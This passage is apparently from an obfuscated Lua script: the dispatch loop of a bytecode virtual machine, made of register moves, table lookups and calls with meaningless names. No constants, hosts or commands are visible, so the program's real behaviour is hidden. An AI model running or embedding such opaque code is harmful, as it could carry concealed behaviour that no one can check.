A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];else local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];end;elseif c<=131 then e[o[2]]();B=A;elseif c>132 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];else local l=o[2];local d=e[o[3]];e[l+1]=d;e[l]=d[e[o[5]]];end;elseif c<=138 then if c<=135 then if c==134 then local D;local a;local c;local C;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;else e[o[2]]=-e[o[3]];end;elseif c<=136 then local J;local D;local a;local c;local C;local A;e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];do return end;elseif c>137 then local J;local a;local c;local C;local D;local A;e[o[2]]={};d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;else local A,A;local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];c=o[2];D,a={e[c]()};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=141 then if c<=139 then local A;local S,A;local c;local A;local D;local a;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*n[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*n[o[5]];d=d+1;o=l[d];a=o[2];D={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;D[A]=e[o];end;S,c=J(e[a](r(D,1,c-a)));c=c+a-1;A=0;for o=a,c do A=A+1;e[o]=S[A];end;B=c;d=d+1;o=l[d];a=o[2];D={};A=0;c=B;for o=a+1,c do A=A+1;D[A]=e[o];end;S={e[a](r(D,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=S[A];end;B=c;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];do return end;elseif c==140 then local n=e[o[3]];if not n then d=d+1;else e[o[2]]=n;d=d+l[d+1][3]+1;end;else e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];if(e[o[2]]~=e[o[5]])then d=d+1;else d=d+o[3];end;end;elseif c<=142 then e[o[2]]=e[o[3]]/e[o[5]];elseif c>143 then if(n[o[2]]>=e[o[5]])then d=d+1;else d=d+o[3];end;else local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];end;elseif c<=154 then if c<=149 then if c<=146 then if c>145 then local l=o[2];local n={};local d=0;local o=l+o[3]-1;for o=l+1,o do d=d+1;n[d]=e[o];end;local n,o=J(e[l](r(n,1,o-l)));o=o+l-1;d=0;for o=l,o do d=d+1;e[o]=n[d];end;B=o;else local T;local S;local J;local a;local c;local D;local A;C[o[3]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do 